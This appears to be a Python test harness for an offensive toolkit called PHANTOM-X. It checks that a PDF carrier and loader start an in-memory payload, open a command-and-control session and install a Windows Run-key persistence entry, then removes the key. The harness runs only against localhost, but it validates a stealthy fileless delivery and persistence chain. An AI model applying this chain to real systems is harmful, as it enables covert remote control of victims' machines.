"""The single-file carrier, with persistence, end to end.

THE FLOW

    px_carrier.pdf  ->  px_loader.exe  ->  payload in memory
                                     ->  C2 session
                                     ->  Run key installed and LEFT

WHAT IS MEASURED

    That the chain works, that the persistence is installed, and that
    the Run key points at something that will actually reproduce the
    session -- the loader, with the document as its argument, because an
    in-memory payload has no image of its own.

    The Run key is REMOVED again at the end of the test. A test that
    leaves the machine changed is not a test.
"""

import os
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
BUNDLE = os.environ.get("BUNDLE") or os.path.join(
    ROOT, "dist", "phantom-x-target-persistent")
SERVER = os.path.join(HERE, "px_c2.exe")
PORT = 9611

RUNKEY = (r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run",
          "PXLab")


def read_runkey():
    """The Run key value, or None.

    reg query, not Get-ItemProperty: the registry provider and the
    full HKEY_CURRENT_USER path do not always agree, and a query that
    silently returns nothing is worse than one that fails loudly.
    """
    try:
        r = subprocess.run(
            ["reg", "query", RUNKEY[0], "/v", RUNKEY[1]],
            capture_output=True, text=True, timeout=60)
        if r.returncode != 0:
            return None
        for line in (r.stdout or "").splitlines():
            if RUNKEY[1] in line:
                # "    PXLab    REG_SZ    <value>"
                parts = line.strip().split(None, 2)
                if len(parts) >= 3:
                    return parts[2].strip()
        return None
    except Exception:  # noqa: BLE001
        return None


def delete_runkey():
    ps = ("Remove-ItemProperty -Path '%s' -Name '%s' -ErrorAction SilentlyContinue"
          % (RUNKEY[0], RUNKEY[1]))
    subprocess.run(["powershell.exe", "-NoProfile", "-ExecutionPolicy",
                    "Bypass", "-Command", ps],
                   capture_output=True, text=True, timeout=60)


def main():
    pdf = os.path.join(BUNDLE, "px_carrier.pdf")
    loader = os.path.join(BUNDLE, "px_loader.exe")
    for p in (pdf, loader):
        if not os.path.isfile(p):
            print(f"error: {p} not found", file=sys.stderr)
            print("  build it:  phase3_fileless\\loader\\make_target_bundle.ps1"
                  " -C2Host <ip> -Arm persistent -Carrier", file=sys.stderr)
            return 2

    # Start from a clean machine state.
    delete_runkey()

    print("=" * 74)
    print("PHANTOM-X :: THE SINGLE-FILE CARRIER, WITH PERSISTENCE")
    print("=" * 74)
    print(f"  carrier : {pdf}")
    print(f"  loader  : {loader}")
    print()

    audit = os.path.join(HERE, "persistent_audit.jsonl")
    srv = subprocess.Popen(
        [SERVER, "--host", "127.0.0.1", "--port", str(PORT), "--log", audit],
        stdin=subprocess.PIPE, stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT, text=True, bufsize=1)
    time.sleep(1.2)

    env = dict(os.environ)
    env["PX_C2_HOST"] = "127.0.0.1"
    env["PX_C2_PORT"] = str(PORT)

    out = ""
    lout = ""
    try:
        print("  opening the document ...")
        lp = subprocess.Popen([loader, pdf], env=env, stdout=subprocess.PIPE,
                               stderr=subprocess.STDOUT, text=True)
        # The stealth arm waits before its FIRST connection, so the
        # session cannot be there yet. Wait past the delay.
        time.sleep(26.0)

        srv.stdin.write("list\n")
        srv.stdin.flush()
        time.sleep(1.0)
        srv.stdin.write("quit\n")
        srv.stdin.flush()
        time.sleep(1.0)

        out, _ = srv.communicate(timeout=10)
        try:
            lp.terminate()
            lout, _ = lp.communicate(timeout=5)
        except Exception:  # noqa: BLE001
            lout = ""
    finally:
        try:
            srv.terminate()
        except Exception:  # noqa: BLE001
            pass

    print("-" * 74)
    print("  THE SERVER CONSOLE")
    print("-" * 74)
    for ln in (out or "").splitlines():
        if ln.strip():
            print("  " + ln)

    if lout:
        print()
        print("-" * 74)
        print("  THE LOADER")
        print("-" * 74)
        for ln in lout.splitlines()[:25]:
            if ln.strip():
                print("  " + ln)
    print()

    # The persistence.
    value = read_runkey()
    print("-" * 74)
    print("  THE PERSISTENCE")
    print("-" * 74)
    if value:
        print(f"  Run key 'PXLab' = {value}")
        print("  It survives a reboot: the key reproduces the session.")
        print("  The command that removes it:")
        print(f"    reg delete \"HKCU\\{RUNKEY[0]}\" /v PXLab /f")
        ok = True
    else:
        print("  NO Run key. The persistence did not install.")
        ok = False

    # Leave the machine as we found it.
    delete_runkey()
    print()
    print("  (the key was removed again: a test that leaves the machine")
    print("   changed is not a test)")
    print()

    session = "session 1 connected" in (out or "")
    ok = ok and session
    print("=" * 74)
    print(f"  RESULT: {'PASS' if ok else 'FAIL'}"
          f"  (session={'yes' if session else 'no'},"
          f" persistence={'yes' if value else 'no'})")
    print("=" * 74)
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
